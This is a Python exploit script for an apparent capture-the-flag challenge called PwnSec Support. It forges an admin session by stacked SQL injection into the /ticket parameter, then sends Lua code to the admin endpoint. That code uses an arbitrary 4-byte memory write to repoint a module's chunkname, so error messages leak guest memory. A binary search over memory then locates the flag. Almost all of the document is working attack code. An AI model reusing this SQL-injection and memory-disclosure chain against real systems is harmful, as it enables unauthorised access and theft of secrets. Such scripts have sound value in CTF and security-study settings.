#!/usr/bin/env python3
"""Arbitrary guest-memory C-string read for PwnSec Support, plus a FLAG locator.

Primitive (see HANDOFF.md): note_save is an arbitrary 4-byte guest write.
`embedded_lua_modules` is a static DATA array of {name, chunkname, source, len}; repointing
one entry's *chunkname* at an arbitrary address and forcing a syntax error makes Lua report

    [string "<bytes at that address, read as a C string>"]:...: near '...'

so it reads the target without ever writing to it.

FLAG is the last DATA object. The handout's FLAGPAD (3.94MB of random bytes) is sized
differently on the live instance, so FLAG's address must be found, not assumed. FLAGPAD is
dense non-zero while everything above the data region reads as NUL, which makes "does a read
at A return a non-empty string" a clean boundary oracle: binary-search it, then probe the
4-byte-aligned candidates just below the boundary for the flag.

All HTTP goes through curl: the edge proxy in front of the live instance rejects requests'
POSTs (RemoteDisconnected) while curl's succeed.

Usage:
  read_mem.py <base> read <addr> [<addr> ...]
  read_mem.py <base> find [<lo> <hi>]
"""
from __future__ import annotations

import html
import re
import subprocess
import sys
import tempfile

TOKEN = "pwnpwn"
DATA_BASE = 0x10000
OFF_MODULES = 0x17E8
MOD_CHUNK = DATA_BASE + OFF_MODULES + 68
MOD_SRC = DATA_BASE + OFF_MODULES + 72
MOD_LEN = DATA_BASE + OFF_MODULES + 76
SCRATCH = 0x10000          # "unknown Lua error" -- 17 bytes that fail to compile
SCRATCH_LEN = 17
MODNAME = "sql.storage"
HEAP_BASE = 0x2000000      # reads above here hit the live heap; keep searches below it


def lua(addr: int) -> str:
    return f"""
local old = package.loaded["{MODNAME}"]
note_save({MOD_CHUNK}, {addr})
note_save({MOD_LEN}, {SCRATCH_LEN})
note_save({MOD_SRC}, {SCRATCH})
package.loaded["{MODNAME}"] = nil
local ok, r = pcall(require, "{MODNAME}")
package.loaded["{MODNAME}"] = old
local t = tostring(r)
local h = {{}}
for i = 1, math.min(#t, 240) do h[#h+1] = string.format("%02x", t:byte(i)) end
print("hex", table.concat(h, ""))
"""


class VM:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.armed = False

    def _curl(self, *args: str) -> str:
        r = subprocess.run(["curl", "-sk", "--max-time", "90", *args],
                           capture_output=True, text=True)
        return r.stdout

    def arm(self) -> None:
        inj = (f"1; INSERT INTO sessions (token, user_id, expires_at, ip_address) "
               f"VALUES ('{TOKEN}', 1, '2099-01-01 00:00:00', '1.1.1.1')")
        self._curl("-G", f"{self.base}/ticket", "--data-urlencode", f"id={inj}",
                   "-o", "/dev/null")
        self.armed = True

    def read(self, addr: int) -> bytes:
        if not self.armed:
            self.arm()
        with tempfile.NamedTemporaryFile("w", suffix=".lua", delete=False) as fh:
            fh.write(lua(addr))
            path = fh.name
        body = ""
        for _ in range(3):
            body = self._curl("-X", "POST", f"{self.base}/admin",
                              "--data-urlencode", f"token={TOKEN}",
                              "--data-urlencode", f"code@{path}")
            if "<pre class=" in body:
                break
            self.arm()
        m = re.search(r'<pre class="out">(.*?)</pre>', body, re.S)
        inner = html.unescape(m.group(1)) if m else ""
        h = re.search(r"hex\s+([0-9a-f]*)", inner)
        raw = bytes.fromhex(h.group(1)) if h and h.group(1) else b""
        m2 = re.match(rb'\[string "(.*?)"\]', raw, re.S)
        return m2.group(1) if m2 else b""


FLAG_RE = re.compile(rb"((?:pwnsec|psctf)\{[^}]*\})")


def find(vm: VM, lo: int = 0x20000, hi: int = HEAP_BASE - 0x1000) -> int | None:
    print(f"[*] boundary search in [0x{lo:x}, 0x{hi:x})", flush=True)
    while lo < hi:
        mid = (lo + hi) // 2 & ~3
        if mid <= lo:
            break
        # a lone NUL inside the random pad would read as empty, so confirm with neighbours
        s = vm.read(mid)
        live = bool(s)
        if not live:
            for d in (4, 8, 16):
                if vm.read(mid + d):
                    live = True
                    break
        print(f"    0x{mid:07x} -> live={live} {len(s):>3} bytes {s[:20]!r}", flush=True)
        if live:
            lo = mid + 4
        else:
            hi = mid
    end = lo
    print(f"[*] data ends near 0x{end:x}", flush=True)

    for k in range(0, 256, 4):
        a = (end - k) & ~3
        s = vm.read(a)
        m = FLAG_RE.search(s)
        if m:
            print(f"[+] 0x{a:x} -> {s[:80]!r}", flush=True)
            print("FLAG:", m.group(1).decode())
            return a
        print(f"    0x{a:07x} -> {s[:48]!r}", flush=True)
    return None


def main() -> int:
    base, cmd = sys.argv[1], sys.argv[2]
    vm = VM(base)
    if cmd == "read":
        for a in sys.argv[3:]:
            addr = int(a, 0)
            s = vm.read(addr)
            print(f"0x{addr:x}: {len(s):>3} {s[:120]!r}")
        return 0
    if cmd == "find":
        if len(sys.argv) >= 5:
            return 0 if find(vm, int(sys.argv[3], 0), int(sys.argv[4], 0)) else 1
        return 0 if find(vm) else 1
    print("unknown command", file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main())
